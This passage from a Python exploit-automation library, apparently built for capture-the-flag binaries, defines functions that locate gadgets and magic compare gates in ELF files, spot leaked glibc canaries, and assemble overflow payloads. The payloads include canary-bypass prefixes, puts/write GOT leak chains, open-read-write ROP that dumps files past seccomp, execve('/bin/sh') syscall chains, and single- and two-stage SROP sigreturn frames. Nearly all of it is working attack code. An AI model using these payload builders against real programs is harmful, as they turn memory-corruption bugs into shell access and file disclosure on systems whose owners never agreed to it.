      * direct compare  -- `cmp dword [rbp-X], IMM32`  (81 7d <disp8> <imm32>) / `[rsp+X]`
      * load-then-compare -- `mov eax, [rbp-X]; cmp eax, IMM32`  (8b 45 <disp8> ... 3d <imm32>)

    the second is what gcc/clang emit for a `volatile` local or at higher optimisation. Returns
    [{va, magic, disp}] where `disp` is the local's signed rbp displacement (negative == a local
    below rbp, the overflowable case)."""
    out = []
    seen = set()
    for off, sz, va, fl in _loads(data):
        if not (fl & 1):                                 # executable segments only
            continue
        seg = data[off:off + sz]
        # (a) direct memory compare against an immediate.
        i = 0
        while True:
            j = seg.find(b"\x81\x7d", i)                 # cmp dword [rbp+disp8], imm32
            k = seg.find(b"\x81\x7c\x24", i)             # cmp dword [rsp+disp8], imm32
            hit = min(x for x in (j, k) if x >= 0) if (j >= 0 or k >= 0) else -1
            if hit < 0:
                break
            i = hit + 1
            rbp = seg[hit:hit + 2] == b"\x81\x7d"
            base = hit + (3 if rbp else 4)
            if base + 4 > len(seg):
                continue
            disp = _s8(seg[base - 1])
            magic = int.from_bytes(seg[base:base + 4], "little")
            if magic > 0x1000 and disp < 0 and _jcc_at(seg, base + 4):
                key = (va + hit, magic)
                if key not in seen:
                    seen.add(key)
                    out.append({"va": va + hit, "magic": magic, "disp": disp, "width": 4})
        # (b) load a local into eax, then compare eax to an immediate: mov eax,[rbp+disp8] (8b 45
        #     <disp8>) followed within a few bytes by cmp eax,imm32 (3d <imm32>) then a jcc.
        i = 0
        while True:
            m = seg.find(b"\x8b\x45", i)                 # mov eax, dword [rbp+disp8]
            if m < 0 or m + 3 > len(seg):
                break
            i = m + 1
            disp = _s8(seg[m + 2])
            if disp >= 0:
                continue
            c = seg.find(b"\x3d", m + 3, m + 12)         # cmp eax, imm32, near the load
            if c < 0 or c + 5 > len(seg):
                continue
            magic = int.from_bytes(seg[c + 1:c + 5], "little")
            if magic > 0x1000 and _jcc_at(seg, c + 5):
                key = (va + m, magic)
                if key not in seen:
                    seen.add(key)
                    out.append({"va": va + m, "magic": magic, "disp": disp, "width": 4})
        # (c) 64-bit magic: `mov r64,[rbp/rsp-X]; movabs rreg, imm64; cmp r64,r64; jcc`. gcc emits
        #     this for a 64-bit local (`unsigned long key == 0x...`); the dword shapes above never
        #     match it, so a whole class of magic gate was invisible and reached no L3 overwrite.
        i = 0
        while True:
            mv = _find_movabs(seg, i)                     # REX.W B8+r : movabs r64, imm64
            if mv < 0 or mv + 10 > len(seg):
                break
            i = mv + 1
            imm = int.from_bytes(seg[mv + 2:mv + 10], "little")
            if imm <= 0xFFFFFFFF:                         # a 32-bit value uses the dword shapes
                continue
            disp = _local_load_disp(seg, mv - 12, mv)     # the local loaded just before the movabs
            if disp is None or disp >= 0:
                continue
            c = seg.find(b"\x48\x39", mv + 10, mv + 16)   # cmp r64, r64 (REX.W 39 /r) just after
            if c < 0 or not _jcc_at(seg, c + 3):
                continue
            key = (va + mv, imm)
            if key not in seen:
                seen.add(key)
                out.append({"va": va + mv, "magic": imm, "disp": disp, "width": 8})
    return out


def find_canary(vals):
    """A leaked stack canary from a set of leaked values (a %p dump / an over-read). glibc's canary
    is a full-width random word with its LOW BYTE forced to 0x00 (so a string read stops before it
    leaks accidentally), so it reads as: low byte 0x00, the rest non-zero and high-entropy, and it
    is NOT a canonical pointer (not the 0x5.../0x7f... ranges of PIE code / stack / libc). Returns
    the first value matching that shape, or None. A caller that knows the exact leak slot should
    pass that value directly rather than rely on this heuristic."""
    for v in vals:
        v = int(v)
        if v & 0xFF:                                     # low byte must be the 0x00 terminator
            continue
        if v >> 8 == 0:                                  # not zero
            continue
        if v < 0x1000000000000:                          # a canary fills the top bytes; small -> no
            continue
        if 0x550000000000 <= v <= 0x5FFFFFFFFFFF:        # looks like a PIE code pointer
            continue
        if 0x7F0000000000 <= v <= 0x7FFFFFFFFFFF:        # looks like a stack / libc / mmap pointer
            continue
        return v
    return None


def build_canary_prefix(canary_offset: int, canary: int, ret_offset: int) -> bytes:
    """The overflow filler that reaches the saved return address WITHOUT tripping the stack
    protector: pad to the canary slot, write the leaked canary back unchanged, then pad across the
    saved frame pointer to the return slot. The caller appends the ROP chain / target address."""
    body = bytearray(b"A" * canary_offset)
    body += struct.pack("<Q", canary & 0xFFFFFFFFFFFFFFFF)
    gap = ret_offset - canary_offset - 8
    body += b"B" * max(0, gap)
    return bytes(body)


def resolve_libc_base(leaked: int, sym_offset: int):
    """libc load base from a leaked runtime address of a symbol at `sym_offset`. A real libc base
    is page-aligned; anything else means the leak was not the pointer we assumed, so return None
    rather than a bogus base that would send every resolved address into the weeds."""
    base = leaked - sym_offset
    return base if base > 0 and base % 0x1000 == 0 else None


def build_leak_puts(offset: int, *, pop_rdi: int, got: int, puts_plt: int, ret_to: int,
                    length: int = 0, ret_gadget=None) -> bytes:
    """Stage 1: cyclic filler, then puts(GOT) -- prints the libc address stored at `got` as raw
    little-endian bytes -- and returns to `ret_to` (the vulnerable function / main) so the program
    loops back and reads stage 2 over the same connection."""
    body = bytearray(_cyclic(offset))
    chain = [pop_rdi, got, puts_plt]
    if ret_gadget:
        chain.append(ret_gadget)                         # keep rsp 16-aligned for the re-entry
    chain.append(ret_to)
    for word in chain:
        body += struct.pack("<Q", word & 0xFFFFFFFFFFFFFFFF)
    if len(body) < length:
        body += b"C" * (length - len(body))
    return bytes(body)


def build_leak_write(offset: int, *, pop_rdi: int, pop_rsi: int, pop_rdx: int, got: int,
                     write_plt: int, ret_to: int, length: int = 0, ret_gadget=None) -> bytes:
    """Stage 1 via write(1, GOT, 8): emits EXACTLY 8 raw bytes of the libc address at `got` -- no
    format interpretation and no NUL/newline truncation, so it is robust where the target exposes
    write() but not puts() (printf-as-string leaks are fragile: a 0x0a or 0x25 byte in the address
    truncates or mis-parses them). Needs clean pop rsi / pop rdx gadgets; returns to `ret_to`."""
    body = bytearray(_cyclic(offset))
    chain = [pop_rdi, 1, pop_rsi, got, pop_rdx, 8, write_plt]
    if ret_gadget:
        chain.append(ret_gadget)
    chain.append(ret_to)
    for word in chain:
        body += struct.pack("<Q", word & 0xFFFFFFFFFFFFFFFF)
    if len(body) < length:
        body += b"C" * (length - len(body))
    return bytes(body)


def _cyclic(n):
    from .primitive import cyclic
    return cyclic(n)


# --------------------------------------------------------------------------- SROP (x86-64)
# Sigreturn-oriented programming: a single `syscall` with rax=15 (rt_sigreturn) restores the ENTIRE
# register set from a frame the attacker placed on the stack. It turns a stack overflow + one
# syscall gadget into arbitrary register control -- enough to call execve("/bin/sh",0,0) without any
# pop-gadgets. Used for static/no-PIE targets where a ret2libc/ret2csu chain isn't available.

_SC = b"\x0f\x05"                                   # syscall
_SC_RET = b"\x0f\x05\xc3"                           # syscall ; ret
_POP_RAX = b"\x58\xc3"                              # pop rax ; ret

# byte offset (in 8-byte words) of each register inside the amd64 rt_sigframe the kernel reads at
# rsp when rt_sigreturn runs. Matches the Linux sigcontext layout (== pwntools SigreturnFrame).
_SIGFRAME_WORDS = {
    "r8": 5, "r9": 6, "r10": 7, "r11": 8, "r12": 9, "r13": 10, "r14": 11, "r15": 12,
    "rdi": 13, "rsi": 14, "rbp": 15, "rbx": 16, "rdx": 17, "rax": 18, "rcx": 19,
    "rsp": 20, "rip": 21,
}
_CSGSFS_WORD = 23                                   # cs=0x33 for 64-bit user code


def find_syscall(data: bytes):
    """VA of a `syscall ; ret` gadget (preferred) or a bare `syscall`, or None."""
    return _find_exec(data, _SC_RET) or _find_exec(data, _SC)


def find_pop_rax(data: bytes):
    """VA of a `pop rax ; ret` gadget, or None (rax must then be set another way)."""
    return _find_exec(data, _POP_RAX)


_MOV_EAX_15 = b"\xb8\x0f\x00\x00\x00\xc3"           # mov eax, 15 ; ret
_MOV_RAX_15 = b"\x48\xc7\xc0\x0f\x00\x00\x00\xc3"   # mov rax, 15 ; ret


def find_rax15(data: bytes):
    """A gadget that puts 15 (rt_sigreturn) into rax for SROP, as (vaddr, kind): `pop rax;ret`
    (kind 'pop' -- the 15 is the NEXT stack word) or `mov eax/rax,15;ret` (kind 'mov' -- no stack
    word). Generalises the SROP bootstrap beyond `pop rax`, which some no-pop-rax binaries lack."""
    a = find_pop_rax(data)
    if a:
        return (a, "pop")
    a = _find_exec(data, _MOV_EAX_15) or _find_exec(data, _MOV_RAX_15)
    if a:
        return (a, "mov")
    return None


def find_writable(data: bytes, need: int = 16):
    """(vaddr, size) of a SAFE fixed writable address to plant bytes on a no-PIE target: an address
    in the .bss (the uninitialized tail of a writable PT_LOAD, past p_filesz) rather than the
    segment START -- the start holds .dynamic/.got/.data, and a read() that overruns them corrupts
    the loader state and crashes before execve. Falls back to the segment start only if no .bss."""
    if len(data) < 64 or data[:4] != b"\x7fELF" or data[4] != 2:
        return None
    endc = "<" if data[5] == 1 else ">"
    e_phoff = struct.unpack_from(endc + "Q", data, 32)[0]
    e_phentsize, e_phnum = struct.unpack_from(endc + "HH", data, 54)
    fallback = None
    for i in range(e_phnum):
        o = e_phoff + i * e_phentsize
        if o + e_phentsize > len(data):
            break
        p_type, p_flags = struct.unpack_from(endc + "II", data, o)
        if p_type != 1 or not (p_flags & 2):            # PT_LOAD, writable (p_flags bit1 = W)
            continue
        p_vaddr = struct.unpack_from(endc + "Q", data, o + 16)[0]
        p_filesz = struct.unpack_from(endc + "Q", data, o + 32)[0]
        p_memsz = struct.unpack_from(endc + "Q", data, o + 40)[0]
        bss = (p_vaddr + p_filesz + 0xF) & ~0xF         # start of .bss, 16-aligned
        room = (p_vaddr + p_memsz) - bss
        if room >= max(need, 16):
            return (bss, room)                          # uninitialized -> safe to clobber
        if fallback is None and p_memsz >= need:
            fallback = (p_vaddr, p_memsz)
    return fallback


def sigreturn_frame(*, rip, rsp=0, rdi=0, rsi=0, rdx=0, rax=0, rbp=0, rbx=0, rcx=0,
                    r8=0, r9=0, r10=0, r11=0, r12=0, r13=0, r14=0, r15=0) -> bytes:
    """The 248-byte amd64 rt_sigframe restored by rt_sigreturn(rax=15). Set the registers the
    controlled `syscall` at `rip` will then use (e.g. rax=59, rdi=&"/bin/sh" for execve)."""
    words = [0] * 31                                # 31 qwords = 0xF8 bytes
    vals = dict(rip=rip, rsp=rsp, rdi=rdi, rsi=rsi, rdx=rdx, rax=rax, rbp=rbp, rbx=rbx, rcx=rcx,
                r8=r8, r9=r9, r10=r10, r11=r11, r12=r12, r13=r13, r14=r14, r15=r15)
    for reg, w in _SIGFRAME_WORDS.items():
        words[w] = vals[reg]
    words[_CSGSFS_WORD] = 0x33
    return b"".join(struct.pack("<Q", v & 0xFFFFFFFFFFFFFFFF) for v in words)


def build_orw_rop(offset: int, *, pop_rdi: int, pop_rsi: int, pop_rdx: int, open_fn: int,
                  read_fn: int, write_fn: int, scratch: int, path_len: int = 24,
                  read_len: int = 256, ret_gadget=None) -> bytes:
    """open/read/write ROP: read the flag PATH from stdin into `scratch`, open() it, read the file
    into `scratch`, write() it to stdout. The go-to finisher when seccomp blocks execve -- it
    discloses a file instead of spawning a shell. Assumes the opened fd is 3 (a fresh process holds
    0/1/2 open), the standard ORW convention. `open_fn/read_fn/write_fn` and the pop gadgets + scratch
    are RUNTIME addresses (libc fns relocated by the leaked base). A `ret_gadget` is interleaved
    before each call to keep rsp 16-aligned for libc's movaps."""
    q = lambda v: struct.pack("<Q", v & 0xFFFFFFFFFFFFFFFF)      # noqa: E731
    pad = q(ret_gadget) if ret_gadget else b""

    def call(fn, *args):
        regs = (pop_rdi, pop_rsi, pop_rdx)
        c = b"".join(q(g) + q(a) for g, a in zip(regs, args))
        return c + pad + q(fn)

    body = bytearray(_cyclic(offset))
    body += call(read_fn, 0, scratch, path_len)      # read(0, scratch, path_len) <- path sent next
    body += call(open_fn, scratch, 0)                # open(scratch, O_RDONLY) -> fd 3
    body += call(read_fn, 3, scratch, read_len)      # read(3, scratch, read_len)
    body += call(write_fn, 1, scratch, read_len)     # write(1, scratch, read_len)
    return bytes(body)


def execve_feasible(data: bytes):
    """What a direct execve("/bin/sh",0,0) syscall ROP needs, and what this binary supplies. Unlike
    SROP it sets the argument registers with plain pop gadgets, so it wants pop rdi/rsi/rdx, a way
    to put 59 in rax (pop rax), a `syscall` gadget and a "/bin/sh" string. The natural chain for a
    binary that imports no `system` but has these gadgets + the string (common in static/CTF
    binaries)."""
    return {
        "syscall": find_syscall(data),
        "pop_rdi": find_gadget(data, "pop_rdi"),
        "pop_rsi": find_gadget(data, "pop_rsi"),
        "pop_rdx": find_gadget(data, "pop_rdx"),
        "pop_rax": find_pop_rax(data),
        "binsh": find_string(data, b"/bin/sh"),
    }


def build_execve_syscall(offset: int, *, binsh: int, syscall: int, pop_rdi: int, pop_rsi: int,
                         pop_rdx: int, pop_rax: int, length: int = 0, ret_gadget=None) -> bytes:
    """cyclic filler, then rdi=&"/bin/sh" ; rsi=0 ; rdx=0 ; rax=59 ; syscall -> execve("/bin/sh",0,0).
    A no-PIE binary uses fixed addresses; a PIE caller relocates each argument by the leaked base."""
    body = bytearray(_cyclic(offset))
    chain = []
    if ret_gadget:
        chain.append(ret_gadget)
    chain += [pop_rdi, binsh, pop_rsi, 0, pop_rdx, 0, pop_rax, 59, syscall]
    for word in chain:
        body += struct.pack("<Q", word & 0xFFFFFFFFFFFFFFFF)
    if len(body) < length:
        body += b"C" * (length - len(body))
    return bytes(body)


def srop_feasible(data: bytes):
    """What an SROP execve chain needs, and which pieces this binary supplies. Returns a dict the
    exploit stage uses to decide: {syscall, pop_rax, writable, binsh}. `syscall` is required; a
    writable segment (to plant "/bin/sh") and a way to set rax=15 are the other gatekeepers."""
    return {
        "syscall": find_syscall(data),
        "pop_rax": find_pop_rax(data),
        "rax15": find_rax15(data),                      # (addr, 'pop'|'mov') -- generalises pop_rax
        "writable": find_writable(data),
        "binsh": find_string(data, b"/bin/sh"),
    }


def build_srop_execve(offset: int, *, syscall: int, binsh: int, length: int,
                      pop_rax: int, rsp: int = 0) -> bytes:
    """One-shot SROP execve("/bin/sh",0,0) for a binary WITH a `pop rax; ret` gadget and "/bin/sh"
    already at `binsh`: overflow -> pop rax;15 -> syscall(rt_sigreturn) -> frame(execve).
    The `syscall` gadget doubles as the frame's rip so the restored rax=59 runs execve."""
    body = bytearray(_cyclic(offset))
    body += struct.pack("<Q", pop_rax)
    body += struct.pack("<Q", 15)                   # rt_sigreturn
    body += struct.pack("<Q", syscall)              # executes rt_sigreturn
    body += sigreturn_frame(rip=syscall, rax=59, rdi=binsh, rsi=0, rdx=0, rsp=rsp or binsh)
    if len(body) < length:
        body += b"C" * (length - len(body))
    return bytes(body)


def build_srop_execve_plant(offset: int, *, syscall: int, rax15, writable: int,
                            count: int = 0x200, binsh_off: int = 0x120):
    """Two-STAGE SROP execve for a binary that has a writable segment and a rax=15 gadget but NO
    "/bin/sh" string in the image: PLANT the string via a read, then execve it. No leak needed on a
    no-PIE target because `writable` is a fixed address. `rax15` is (vaddr, kind) from find_rax15:
    a `pop rax;ret` (the 15 follows on the stack) or a `mov eax/rax,15;ret` (no stack word).

      stage1 (to the overflowing read): pad(offset) -> set rax=15 -> syscall(rt_sigreturn) ->
        frame{rax=0(read), rdi=0, rsi=writable, rdx=count, rip=syscall, rsp=writable}
        -- so after the read the `ret` pivots rsp INTO the freshly-read stage2.
      stage2 (to that read): set rax=15 -> syscall(rt_sigreturn) ->
        frame{rax=59(execve), rdi=writable+binsh_off, rip=syscall} ... "/bin/sh\\0" at +binsh_off.

    Returns (stage1, stage2): send stage1 to the overflow, then stage2 to the planted read.
    """
    gaddr, kind = rax15

    def _set_rax15():                                # put 15 in rax, then the syscall gadget
        if kind == "pop":                            # pop rax; ret -- 15 is the next stack word
            return struct.pack("<Q", gaddr) + struct.pack("<Q", 15) + struct.pack("<Q", syscall)
        return struct.pack("<Q", gaddr) + struct.pack("<Q", syscall)   # mov eax,15;ret -- no word
    binsh = writable + binsh_off
    stage2 = _set_rax15() + sigreturn_frame(rip=syscall, rax=59, rdi=binsh, rsi=0, rdx=0,
                                            rsp=writable)
    stage2 = stage2.ljust(binsh_off, b"\x00") + b"/bin/sh\x00"
    frame1 = sigreturn_frame(rip=syscall, rax=0, rdi=0, rsi=writable, rdx=count, rsp=writable)
    stage1 = bytes(_cyclic(offset)) + _set_rax15() + frame1
    return stage1, stage2
